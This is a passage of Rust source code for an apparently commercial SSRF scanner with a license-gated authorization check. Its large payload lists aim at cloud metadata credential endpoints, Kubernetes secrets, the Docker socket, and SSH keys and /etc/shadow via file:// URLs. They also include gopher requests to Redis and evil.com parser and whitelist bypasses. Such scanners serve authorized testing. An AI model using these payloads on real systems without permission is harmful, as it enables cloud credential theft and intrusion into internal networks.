// Copyright (c) 2025 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - Enterprise SSRF (Server-Side Request Forgery) Scanner
 * Advanced SSRF detection with 200+ bypass techniques
 *
 * Features:
 * - 200+ bypass payloads across 15+ categories
 * - IP address obfuscation (decimal, octal, hex, IPv6)
 * - DNS rebinding techniques
 * - URL parser differential attacks
 * - Protocol smuggling (file://, gopher://, dict://, etc.)
 * - Cloud metadata for AWS, GCP, Azure, DigitalOcean, Alibaba, Oracle
 * - Internal service discovery patterns
 * - Unicode/encoding bypasses
 * - Double-encoding bypasses
 * - Whitelist bypass techniques
 * - IPv6 address manipulation
 * - Localhost alternative representations
 *
 * @copyright 2025 Bountyy Oy
 * @license Proprietary - Enterprise Edition
 */

use crate::http_client::{HttpClient, HttpResponse};
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use anyhow::Result;
use std::sync::Arc;
use tracing::{debug, info, warn};

/// SSRF bypass category for classification
#[derive(Debug, Clone, PartialEq)]
pub enum SsrfBypassCategory {
    /// Cloud metadata service access (AWS, GCP, Azure, etc.)
    CloudMetadata,
    /// IP address obfuscation (decimal, octal, hex)
    IpObfuscation,
    /// DNS rebinding attacks
    DnsRebinding,
    /// URL parser differential attacks
    UrlParserDifferential,
    /// Protocol smuggling (file://, gopher://, etc.)
    ProtocolSmuggling,
    /// IPv6 manipulation
    Ipv6Bypass,
    /// Encoding bypass (URL, double, unicode)
    EncodingBypass,
    /// Whitelist/filter bypass
    WhitelistBypass,
    /// Internal network scanning
    InternalNetwork,
    /// Localhost alternatives
    LocalhostBypass,
    /// Redirect-based bypass
    RedirectBypass,
    /// Port scanning via SSRF
    PortScan,
    /// DNS exfiltration
    DnsExfiltration,
    /// Cloud service endpoints
    CloudServices,
    /// Container/Kubernetes metadata
    ContainerMetadata,
}

impl SsrfBypassCategory {
    fn as_str(&self) -> &str {
        match self {
            Self::CloudMetadata => "Cloud Metadata",
            Self::IpObfuscation => "IP Obfuscation",
            Self::DnsRebinding => "DNS Rebinding",
            Self::UrlParserDifferential => "URL Parser Differential",
            Self::ProtocolSmuggling => "Protocol Smuggling",
            Self::Ipv6Bypass => "IPv6 Bypass",
            Self::EncodingBypass => "Encoding Bypass",
            Self::WhitelistBypass => "Whitelist Bypass",
            Self::InternalNetwork => "Internal Network",
            Self::LocalhostBypass => "Localhost Bypass",
            Self::RedirectBypass => "Redirect Bypass",
            Self::PortScan => "Port Scan",
            Self::DnsExfiltration => "DNS Exfiltration",
            Self::CloudServices => "Cloud Services",
            Self::ContainerMetadata => "Container Metadata",
        }
    }
}

/// SSRF payload with metadata
struct SsrfPayload {
    payload: String,
    category: SsrfBypassCategory,
    description: String,
    severity: Severity,
}

pub struct SsrfScanner {
    http_client: Arc<HttpClient>,
}

impl SsrfScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    /// Scan a parameter for SSRF vulnerabilities
    pub async fn scan_parameter(
        &self,
        base_url: &str,
        parameter: &str,
        _config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        // ============================================================
        // MANDATORY AUTHORIZATION CHECK - CANNOT BE BYPASSED
        // ============================================================
        // Defense in depth: verify both license and signing authorization
        if !crate::license::verify_scan_authorized() {
            return Ok((Vec::new(), 0));
        }
        if !crate::signing::is_scan_authorized() {
            tracing::warn!("SSRF scan blocked: No valid scan authorization");
            return Ok((Vec::new(), 0));
        }

        info!("[SSRF] Enterprise scanner - testing parameter: {}", parameter);

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // Get baseline response first - critical for avoiding false positives
        let baseline = match self.http_client.get(base_url).await {
            Ok(response) => response,
            Err(e) => {
                debug!("Failed to get baseline for SSRF testing: {}", e);
                return Ok((Vec::new(), 0));
            }
        };

        // Get comprehensive enterprise payloads based on license
        let payloads = if crate::license::is_feature_available("enterprise_ssrf") {
            self.generate_enterprise_payloads()
        } else if crate::license::is_feature_available("ssrf_scanning") {
            self.generate_professional_payloads()
        } else {
            self.generate_basic_payloads()
        };

        info!("[SSRF] Testing {} bypass payloads", payloads.len());

        for ssrf_payload in &payloads {
            tests_run += 1;

            let test_url = if base_url.contains('?') {
                format!("{}&{}={}", base_url, parameter, urlencoding::encode(&ssrf_payload.payload))
            } else {
                format!("{}?{}={}", base_url, parameter, urlencoding::encode(&ssrf_payload.payload))
            };

            debug!("Testing SSRF [{}]: {}", ssrf_payload.category.as_str(), ssrf_payload.description);

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if let Some(vuln) = self.analyze_ssrf_response(
                        &response,
                        ssrf_payload,
                        parameter,
                        &test_url,
                        &baseline,
                    ) {
                        info!(
                            "[ALERT] SSRF vulnerability detected via {} in parameter '{}'",
                            ssrf_payload.category.as_str(),
                            parameter
                        );
                        vulnerabilities.push(vuln);
                        break; // Found vulnerability, no need to continue
                    }
                }
                Err(e) => {
                    debug!("SSRF test error: {}", e);
                    // Timeouts or network errors might indicate blind SSRF
                    if ssrf_payload.payload.contains("169.254.169.254") ||
                       ssrf_payload.payload.contains("metadata") {
                        warn!("[WARNING] Possible blind SSRF - request to metadata service failed");
                    }
                }
            }
        }

        info!(
            "[SUCCESS] [SSRF] Completed {} tests on parameter '{}', found {} vulnerabilities",
            tests_run,
            parameter,
            vulnerabilities.len()
        );

        Ok((vulnerabilities, tests_run))
    }

    /// Generate enterprise-grade SSRF payloads (200+)
    fn generate_enterprise_payloads(&self) -> Vec<SsrfPayload> {
        let mut payloads = Vec::new();

        // ============================================================
        // CATEGORY 1: AWS EC2 METADATA (25+ payloads)
        // ============================================================
        let aws_payloads = vec![
            // IMDSv1 - Standard endpoints
            ("http://169.254.169.254/latest/meta-data/", "AWS IMDSv1 metadata root"),
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM credentials listing"),
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role", "AWS IAM admin role"),
            ("http://169.254.169.254/latest/user-data/", "AWS user data (startup scripts)"),
            ("http://169.254.169.254/latest/dynamic/instance-identity/document", "AWS instance identity"),
            ("http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance", "AWS EC2 instance creds"),
            ("http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key", "AWS SSH public key"),
            ("http://169.254.169.254/latest/meta-data/hostname", "AWS hostname"),
            ("http://169.254.169.254/latest/meta-data/local-ipv4", "AWS local IPv4"),
            ("http://169.254.169.254/latest/meta-data/public-ipv4", "AWS public IPv4"),

            // IMDSv2 - Token-based (testing for downgrade)
            ("http://169.254.169.254/latest/api/token", "AWS IMDSv2 token endpoint"),

            // AWS ECS/Fargate metadata
            ("http://169.254.170.2/v2/credentials", "AWS ECS task credentials"),
            ("http://169.254.170.2/v2/metadata", "AWS ECS task metadata"),

            // AWS Lambda metadata
            ("http://localhost:9001/2018-06-01/runtime/invocation/next", "AWS Lambda runtime API"),

            // IP obfuscation for AWS metadata
            ("http://0xA9FEA9FE/latest/meta-data/", "AWS metadata hex IP"),
            ("http://0251.0376.0251.0376/latest/meta-data/", "AWS metadata octal IP"),
            ("http://2852039166/latest/meta-data/", "AWS metadata decimal IP"),
            ("http://0251.254.169.254/latest/meta-data/", "AWS metadata mixed octal"),
            ("http://169.254.0xa9.0xfe/latest/meta-data/", "AWS metadata mixed hex"),
            ("http://[::ffff:169.254.169.254]/latest/meta-data/", "AWS metadata IPv6 mapped"),
            ("http://169.254.169.254.nip.io/latest/meta-data/", "AWS metadata via nip.io"),
            ("http://169.254.169.254.xip.io/latest/meta-data/", "AWS metadata via xip.io"),
            ("http://metadata.google.internal@169.254.169.254/latest/meta-data/", "AWS metadata with @ bypass"),
            ("http://169.254.169.254:80/latest/meta-data/", "AWS metadata explicit port 80"),
            ("http://169.254.169.254%2f%2e%2e/latest/meta-data/", "AWS metadata encoded slash"),
        ];

        for (url, desc) in aws_payloads {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::CloudMetadata,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        // ============================================================
        // CATEGORY 2: GCP METADATA (15+ payloads)
        // ============================================================
        let gcp_payloads = vec![
            ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata root"),
            ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "GCP default SA token"),
            ("http://metadata.google.internal/computeMetadata/v1/project/project-id", "GCP project ID"),
            ("http://metadata.google.internal/computeMetadata/v1/instance/zone", "GCP instance zone"),
            ("http://metadata.google.internal/computeMetadata/v1/instance/hostname", "GCP instance hostname"),
            ("http://metadata.google.internal/computeMetadata/v1/instance/attributes/", "GCP instance attributes"),
            ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", "GCP service accounts"),
            ("http://metadata/computeMetadata/v1/", "GCP short metadata"),
            ("http://169.254.169.254/computeMetadata/v1/", "GCP metadata via link-local"),
            ("http://metadata.google.internal./computeMetadata/v1/", "GCP metadata trailing dot"),

            // GCP Kubernetes metadata
            ("http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", "GKE kube-env"),
            ("http://metadata.google.internal/computeMetadata/v1/instance/attributes/cluster-name", "GKE cluster name"),

            // IP obfuscation for GCP
            ("http://0xA9FEA9FE/computeMetadata/v1/", "GCP metadata hex IP"),
            ("http://2852039166/computeMetadata/v1/", "GCP metadata decimal IP"),
        ];

        for (url, desc) in gcp_payloads {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::CloudMetadata,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        // ============================================================
        // CATEGORY 3: AZURE METADATA (15+ payloads)
        // ============================================================
        let azure_payloads = vec![
            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure IMDS instance"),
            ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "Azure managed identity token"),
            ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net", "Azure KeyVault token"),
            ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/", "Azure Storage token"),
            ("http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01", "Azure compute metadata"),
            ("http://169.254.169.254/metadata/instance/network?api-version=2021-02-01", "Azure network metadata"),

            // Azure Wire Server (internal)
            ("http://168.63.129.16/machine?comp=goalstate", "Azure Wire Server goalstate"),
            ("http://168.63.129.16/machine/plugins?comp=config&type=hostingEnvironmentConfig", "Azure hosting config"),

            // Azure Kubernetes (AKS)
            ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=6dae42f8-4368-4678-94ff-3960e28e3630", "AKS cluster resource token"),

            // IP obfuscation for Azure
            ("http://0xA9FEA9FE/metadata/instance?api-version=2021-02-01", "Azure metadata hex IP"),
            ("http://2852039166/metadata/instance?api-version=2021-02-01", "Azure metadata decimal IP"),
            ("http://[::ffff:169.254.169.254]/metadata/instance?api-version=2021-02-01", "Azure metadata IPv6"),
        ];

        for (url, desc) in azure_payloads {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::CloudMetadata,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        // ============================================================
        // CATEGORY 4: OTHER CLOUD PROVIDERS (15+ payloads)
        // ============================================================
        let other_cloud_payloads = vec![
            // DigitalOcean
            ("http://169.254.169.254/metadata/v1.json", "DigitalOcean metadata JSON"),
            ("http://169.254.169.254/metadata/v1/", "DigitalOcean metadata root"),
            ("http://169.254.169.254/metadata/v1/hostname", "DigitalOcean hostname"),
            ("http://169.254.169.254/metadata/v1/region", "DigitalOcean region"),

            // Alibaba Cloud
            ("http://100.100.100.200/latest/meta-data/", "Alibaba Cloud metadata"),
            ("http://100.100.100.200/latest/meta-data/ram/security-credentials/", "Alibaba RAM credentials"),
            ("http://100.100.100.200/latest/meta-data/instance-id", "Alibaba instance ID"),

            // Oracle Cloud
            ("http://169.254.169.254/opc/v1/instance/", "Oracle Cloud metadata"),
            ("http://169.254.169.254/opc/v1/identity/", "Oracle Cloud identity"),
            ("http://169.254.169.254/opc/v2/instance/", "Oracle Cloud v2 metadata"),

            // Hetzner Cloud
            ("http://169.254.169.254/hetzner/v1/metadata", "Hetzner Cloud metadata"),
            ("http://169.254.169.254/hetzner/v1/metadata/hostname", "Hetzner hostname"),

            // Vultr
            ("http://169.254.169.254/v1.json", "Vultr metadata JSON"),
            ("http://169.254.169.254/v1/", "Vultr metadata root"),

            // OpenStack
            ("http://169.254.169.254/openstack/latest/meta_data.json", "OpenStack metadata"),
            ("http://169.254.169.254/openstack/latest/user_data", "OpenStack user data"),
        ];

        for (url, desc) in other_cloud_payloads {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::CloudMetadata,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        // ============================================================
        // CATEGORY 5: LOCALHOST BYPASSES (30+ payloads)
        // ============================================================
        let localhost_payloads = vec![
            // Standard localhost
            ("http://localhost/", "Standard localhost"),
            ("http://localhost:80/", "localhost port 80"),
            ("http://localhost:443/", "localhost port 443"),
            ("http://localhost:8080/", "localhost port 8080"),
            ("http://localhost:8000/", "localhost port 8000"),

            // 127.0.0.1 variations
            ("http://127.0.0.1/", "Standard 127.0.0.1"),
            ("http://127.0.0.1:22/", "127.0.0.1 SSH"),
            ("http://127.0.0.1:3306/", "127.0.0.1 MySQL"),
            ("http://127.0.0.1:5432/", "127.0.0.1 PostgreSQL"),
            ("http://127.0.0.1:6379/", "127.0.0.1 Redis"),
            ("http://127.0.0.1:27017/", "127.0.0.1 MongoDB"),
            ("http://127.0.0.1:9200/", "127.0.0.1 Elasticsearch"),
            ("http://127.0.0.1:11211/", "127.0.0.1 Memcached"),

            // Shortened localhost
            ("http://127.1/", "Shortened 127.1"),
            ("http://127.0.1/", "Shortened 127.0.1"),
            ("http://127.127.127.127/", "All 127s"),

            // Decimal representation
            ("http://2130706433/", "127.0.0.1 decimal"),

            // Hexadecimal
            ("http://0x7f000001/", "127.0.0.1 hex"),
            ("http://0x7f.0x0.0x0.0x1/", "127.0.0.1 dotted hex"),
            ("http://0x7f.0.0.1/", "127.0.0.1 mixed hex"),

            // Octal
            ("http://0177.0.0.1/", "127.0.0.1 octal"),
            ("http://0177.0000.0000.0001/", "127.0.0.1 full octal"),
            ("http://0177.0.0.01/", "127.0.0.1 mixed octal"),

            // IPv6
            ("http://[::1]/", "IPv6 localhost"),
            ("http://[0:0:0:0:0:0:0:1]/", "IPv6 localhost full"),
            ("http://[::ffff:127.0.0.1]/", "IPv6 mapped IPv4"),
            ("http://[0000:0000:0000:0000:0000:0000:0000:0001]/", "IPv6 localhost zero-padded"),

            // Zero IP (bound to all interfaces, often works as localhost)
            ("http://0.0.0.0/", "Zero IP"),
            ("http://0/", "Zero IP short"),
            ("http://0.0.0.0:80/", "Zero IP port 80"),

            // Localhost DNS tricks
            ("http://localtest.me/", "localtest.me (resolves to 127.0.0.1)"),
            ("http://127.0.0.1.nip.io/", "nip.io localhost"),
            ("http://127.0.0.1.xip.io/", "xip.io localhost"),
            ("http://localhost.localdomain/", "localhost.localdomain"),
            ("http://lvh.me/", "lvh.me (resolves to 127.0.0.1)"),
        ];

        for (url, desc) in localhost_payloads {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::LocalhostBypass,
                description: desc.to_string(),
                severity: Severity::High,
            });
        }

        // ============================================================
        // CATEGORY 6: INTERNAL NETWORK (20+ payloads)
        // ============================================================
        let internal_payloads = vec![
            // RFC 1918 - 10.0.0.0/8
            ("http://10.0.0.1/", "Internal 10.0.0.1"),
            ("http://10.0.0.1:8080/", "Internal 10.0.0.1:8080"),
            ("http://10.10.10.10/", "Internal 10.10.10.10"),
            ("http://10.255.255.1/", "Internal 10.255.255.1"),

            // RFC 1918 - 172.16.0.0/12
            ("http://172.16.0.1/", "Internal 172.16.0.1"),
            ("http://172.16.0.1:8080/", "Internal 172.16.0.1:8080"),
            ("http://172.31.255.255/", "Internal 172.31.255.255"),

            // RFC 1918 - 192.168.0.0/16
            ("http://192.168.0.1/", "Internal 192.168.0.1 (router)"),
            ("http://192.168.1.1/", "Internal 192.168.1.1 (router)"),
            ("http://192.168.0.100/", "Internal 192.168.0.100"),
            ("http://192.168.1.100/", "Internal 192.168.1.100"),

            // Link-local
            ("http://169.254.0.1/", "Link-local 169.254.0.1"),
            ("http://169.254.1.1/", "Link-local 169.254.1.1"),

            // Common internal services
            ("http://consul.service.consul:8500/v1/catalog/services", "Consul service discovery"),
            ("http://vault.service.consul:8200/v1/sys/health", "HashiCorp Vault"),
            ("http://internal-api/", "Internal API"),
            ("http://backend/", "Backend service"),
            ("http://database/", "Database service"),
            ("http://redis/", "Redis service"),
            ("http://elasticsearch:9200/", "Elasticsearch"),
            ("http://kafka:9092/", "Kafka"),
        ];

        for (url, desc) in internal_payloads {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::InternalNetwork,
                description: desc.to_string(),
                severity: Severity::High,
            });
        }

        // ============================================================
        // CATEGORY 7: PROTOCOL SMUGGLING (25+ payloads)
        // ============================================================
        let protocol_payloads = vec![
            // File protocol
            ("file:///etc/passwd", "File /etc/passwd"),
            ("file:///etc/shadow", "File /etc/shadow"),
            ("file:///etc/hosts", "File /etc/hosts"),
            ("file:///etc/hostname", "File /etc/hostname"),
            ("file:///proc/self/environ", "File /proc/self/environ"),
            ("file:///proc/self/cmdline", "File /proc/self/cmdline"),
            ("file:///proc/net/fib_trie", "File /proc/net/fib_trie"),
            ("file:///proc/net/arp", "File /proc/net/arp"),
            ("file:///root/.ssh/id_rsa", "File SSH private key"),
            ("file:///root/.bash_history", "File bash history"),
            ("file:///var/log/apache2/access.log", "File Apache access log"),
            ("file:///var/log/nginx/access.log", "File Nginx access log"),
            ("file://localhost/etc/passwd", "File localhost path"),
            ("file:///c:/windows/win.ini", "File Windows win.ini"),
            ("file:///c:/windows/system32/drivers/etc/hosts", "File Windows hosts"),

            // Gopher protocol (can interact with various services)
            ("gopher://127.0.0.1:25/", "Gopher SMTP"),
            ("gopher://127.0.0.1:6379/_INFO", "Gopher Redis INFO"),
            ("gopher://127.0.0.1:6379/_CONFIG%20GET%20*", "Gopher Redis CONFIG"),
            ("gopher://127.0.0.1:11211/_stats", "Gopher Memcached stats"),
            ("gopher://127.0.0.1:3306/", "Gopher MySQL"),

            // Dict protocol
            ("dict://127.0.0.1:11211/stats", "Dict Memcached"),
            ("dict://127.0.0.1:6379/info", "Dict Redis"),

            // LDAP
            ("ldap://127.0.0.1:389/", "LDAP localhost"),
            ("ldap://localhost/", "LDAP localhost short"),

            // FTP
            ("ftp://127.0.0.1:21/", "FTP localhost"),
            ("ftp://anonymous@127.0.0.1/", "FTP anonymous"),

            // TFTP
            ("tftp://127.0.0.1/etc/passwd", "TFTP /etc/passwd"),

            // Netdoc (Java-specific)
            ("netdoc:///etc/passwd", "Netdoc /etc/passwd"),

            // Jar protocol (Java-specific)
            ("jar:http://127.0.0.1/test.jar!/", "Jar protocol"),
        ];

        for (url, desc) in protocol_payloads {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::ProtocolSmuggling,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        // ============================================================
        // CATEGORY 8: URL PARSER DIFFERENTIAL (20+ payloads)
        // ============================================================
        let parser_payloads = vec![
            // Credential section bypass
            ("http://evil.com@169.254.169.254/latest/meta-data/", "Credential bypass @"),
            ("http://169.254.169.254@evil.com/", "Credential bypass reversed"),
            ("http://evil.com:80@169.254.169.254/", "Credential with port"),
            ("http://evil.com%40169.254.169.254/", "Encoded @ sign"),

            // Fragment bypass
            ("http://169.254.169.254#@evil.com/", "Fragment bypass"),
            ("http://evil.com#.169.254.169.254/", "Fragment bypass 2"),

            // Backslash bypass (Windows)
            ("http://169.254.169.254\\@evil.com/", "Backslash bypass"),
            ("http://evil.com\\169.254.169.254/", "Backslash path"),

            // Tab/newline bypass
            ("http://169.254.169.254%09/latest/meta-data/", "Tab in URL"),
            ("http://169.254.169.254%0d/latest/meta-data/", "CR in URL"),
            ("http://169.254.169.254%0a/latest/meta-data/", "LF in URL"),

            // Double URL encoding
            ("http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/", "URL encoded IP"),
            ("http://%2531%2536%2539%252e%2532%2535%2534%252e%2531%2536%2539%252e%2532%2535%2534/", "Double encoded IP"),

            // Unicode bypass
            ("http://169。254。169。254/", "Unicode fullwidth dots"),
            ("http://169．254．169．254/", "Unicode halfwidth dots"),
            ("http://①②⑦.0.0.①/", "Unicode circled numbers"),

            // Case manipulation (some parsers)
            ("HTTP://169.254.169.254/", "Uppercase protocol"),
            ("Http://169.254.169.254/", "Mixed case protocol"),

            // Path manipulation
            ("http://169.254.169.254/latest/./meta-data/", "Dot path"),
            ("http://169.254.169.254/latest/../latest/meta-data/", "Dotdot path"),
            ("http://169.254.169.254//latest//meta-data/", "Double slash"),
        ];

        for (url, desc) in parser_payloads {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::UrlParserDifferential,
                description: desc.to_string(),
                severity: Severity::High,
            });
        }

        // ============================================================
        // CATEGORY 9: CONTAINER/KUBERNETES METADATA (15+ payloads)
        // ============================================================
        let k8s_payloads = vec![
            // Kubernetes API Server
            ("http://kubernetes.default.svc/api/v1/namespaces/default/pods", "K8s pods list"),
            ("http://kubernetes.default.svc/api/v1/namespaces/default/secrets", "K8s secrets list"),
            ("http://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets", "K8s kube-system secrets"),
            ("http://kubernetes.default/", "K8s API short"),
            ("https://kubernetes.default.svc:443/", "K8s API HTTPS"),

            // Kubernetes internal DNS
            ("http://kube-dns.kube-system.svc.cluster.local/", "K8s DNS service"),
            ("http://metrics-server.kube-system.svc.cluster.local/", "K8s metrics server"),

            // Docker socket
            ("http://docker.sock/v1.24/containers/json", "Docker socket containers"),
            ("http://docker.sock/v1.24/info", "Docker socket info"),
            ("http://unix:/var/run/docker.sock:/v1.24/containers/json", "Docker Unix socket"),

            // Containerd
            ("http://unix:/run/containerd/containerd.sock:/v1/containers", "Containerd socket"),

            // Rancher metadata
            ("http://rancher-metadata/", "Rancher metadata"),
            ("http://rancher-metadata/latest/self/container", "Rancher container info"),

            // Linkerd/Istio
            ("http://localhost:15000/config_dump", "Envoy config (Istio/Linkerd)"),
            ("http://localhost:15020/healthz/ready", "Istio sidecar health"),
        ];

        for (url, desc) in k8s_payloads {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::ContainerMetadata,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        // ============================================================
        // CATEGORY 10: DNS REBINDING (10+ payloads)
        // ============================================================
        let dns_payloads = vec![
            ("http://A.127.0.0.1.1time.169.254.169.254.1time.repeat.rebind.network/", "DNS rebind to metadata"),
            ("http://make-127-0-0-1-and-169-254-169-254-rr.1u.ms/", "1u.ms rebind"),
            ("http://localtest.me/", "localtest.me 127.0.0.1"),
            ("http://customer1.app.localhost.my.company.127.0.0.1.nip.io/", "nip.io complex"),
            ("http://www.127.0.0.1.xip.io/", "xip.io"),
            ("http://spoofed.burpcollaborator.net/", "Burp Collaborator pattern"),
            ("http://127.0.0.1.sslip.io/", "sslip.io localhost"),
            ("http://magic.localhost/", "magic.localhost"),
            ("http://internal.localhost/", "internal.localhost"),
        ];

        for (url, desc) in dns_payloads {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::DnsRebinding,
                description: desc.to_string(),
                severity: Severity::High,
            });
        }

        // ============================================================
        // CATEGORY 11: WHITELIST BYPASS (15+ payloads)
        // ============================================================
        let whitelist_payloads = vec![
            // Domain bypass attempts
            ("http://evil.com?.example.com", "Query string domain bypass"),
            ("http://example.com.evil.com/", "Subdomain of evil domain"),
            ("http://example.com%252f@evil.com/", "Double encoded bypass"),
            ("http://example.com%2f%2f@evil.com/", "Encoded slash bypass"),

            // Open redirect chains
            ("http://example.com/redirect?url=http://169.254.169.254/", "Open redirect chain"),
            ("http://example.com/login?next=http://169.254.169.254/", "Login redirect chain"),
            ("http://example.com/oauth?redirect_uri=http://169.254.169.254/", "OAuth redirect chain"),

            // Subdomain confusion
            ("http://169.254.169.254.example.com/", "IP as subdomain"),
            ("http://localhost.example.com/", "localhost subdomain"),
            ("http://internal.example.com/", "internal subdomain"),
            ("http://backend.example.com/", "backend subdomain"),

            // Port in hostname (some parsers)
            ("http://example.com:80@169.254.169.254/", "Port in auth section"),

            // URL fragment
            ("http://example.com#@169.254.169.254/", "Fragment bypass"),

            // CRLF injection
            ("http://example.com%0d%0aHost:%20169.254.169.254/", "CRLF Host injection"),
        ];

        for (url, desc) in whitelist_payloads {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::WhitelistBypass,
                description: desc.to_string(),
                severity: Severity::High,
            });
        }

        // ============================================================
        // CATEGORY 12: PORT SCANNING (10+ payloads)
        // ============================================================
        let port_scan_payloads = vec![
            ("http://127.0.0.1:21/", "FTP port 21"),
            ("http://127.0.0.1:22/", "SSH port 22"),
            ("http://127.0.0.1:23/", "Telnet port 23"),
            ("http://127.0.0.1:25/", "SMTP port 25"),
            ("http://127.0.0.1:53/", "DNS port 53"),
            ("http://127.0.0.1:110/", "POP3 port 110"),
            ("http://127.0.0.1:143/", "IMAP port 143"),
            ("http://127.0.0.1:389/", "LDAP port 389"),
            ("http://127.0.0.1:445/", "SMB port 445"),
            ("http://127.0.0.1:1433/", "MSSQL port 1433"),
            ("http://127.0.0.1:1521/", "Oracle port 1521"),
            ("http://127.0.0.1:2049/", "NFS port 2049"),
            ("http://127.0.0.1:2375/", "Docker API port 2375"),
            ("http://127.0.0.1:2376/", "Docker TLS port 2376"),
            ("http://127.0.0.1:5000/", "Flask default port 5000"),
            ("http://127.0.0.1:5601/", "Kibana port 5601"),
            ("http://127.0.0.1:8443/", "HTTPS alt port 8443"),
            ("http://127.0.0.1:9000/", "PHP-FPM port 9000"),
            ("http://127.0.0.1:15672/", "RabbitMQ management"),
        ];

        for (url, desc) in port_scan_payloads {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::PortScan,
                description: desc.to_string(),
                severity: Severity::Medium,
            });
        }

        info!("[SSRF] Generated {} enterprise-grade payloads", payloads.len());
        payloads
    }

    /// Generate professional-tier SSRF payloads (100+)
    fn generate_professional_payloads(&self) -> Vec<SsrfPayload> {
        let mut payloads = Vec::new();

        // AWS Metadata - Essential
        let aws_essential = vec![
            ("http://169.254.169.254/latest/meta-data/", "AWS IMDSv1 metadata root"),
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM credentials"),
            ("http://169.254.169.254/latest/user-data/", "AWS user data"),
            ("http://169.254.169.254/latest/dynamic/instance-identity/document", "AWS instance identity"),
            ("http://0xA9FEA9FE/latest/meta-data/", "AWS metadata hex IP"),
            ("http://2852039166/latest/meta-data/", "AWS metadata decimal IP"),
        ];

        for (url, desc) in aws_essential {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::CloudMetadata,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        // GCP Metadata - Essential
        let gcp_essential = vec![
            ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata root"),
            ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "GCP SA token"),
            ("http://metadata/computeMetadata/v1/", "GCP short metadata"),
        ];

        for (url, desc) in gcp_essential {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::CloudMetadata,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        // Azure Metadata - Essential
        let azure_essential = vec![
            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure IMDS"),
            ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "Azure managed identity"),
        ];

        for (url, desc) in azure_essential {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::CloudMetadata,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        // Localhost bypasses - Essential
        let localhost_essential = vec![
            ("http://localhost/", "Standard localhost"),
            ("http://127.0.0.1/", "Standard 127.0.0.1"),
            ("http://127.1/", "Shortened 127.1"),
            ("http://2130706433/", "127.0.0.1 decimal"),
            ("http://0x7f000001/", "127.0.0.1 hex"),
            ("http://0177.0.0.1/", "127.0.0.1 octal"),
            ("http://[::1]/", "IPv6 localhost"),
            ("http://0.0.0.0/", "Zero IP"),
            ("http://localtest.me/", "localtest.me DNS"),
        ];

        for (url, desc) in localhost_essential {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::LocalhostBypass,
                description: desc.to_string(),
                severity: Severity::High,
            });
        }

        // Internal network - Essential
        let internal_essential = vec![
            ("http://10.0.0.1/", "Internal 10.0.0.1"),
            ("http://172.16.0.1/", "Internal 172.16.0.1"),
            ("http://192.168.0.1/", "Internal 192.168.0.1"),
            ("http://192.168.1.1/", "Internal 192.168.1.1"),
        ];

        for (url, desc) in internal_essential {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::InternalNetwork,
                description: desc.to_string(),
                severity: Severity::High,
            });
        }

        // Protocol smuggling - Essential
        let protocol_essential = vec![
            ("file:///etc/passwd", "File /etc/passwd"),
            ("file:///etc/hosts", "File /etc/hosts"),
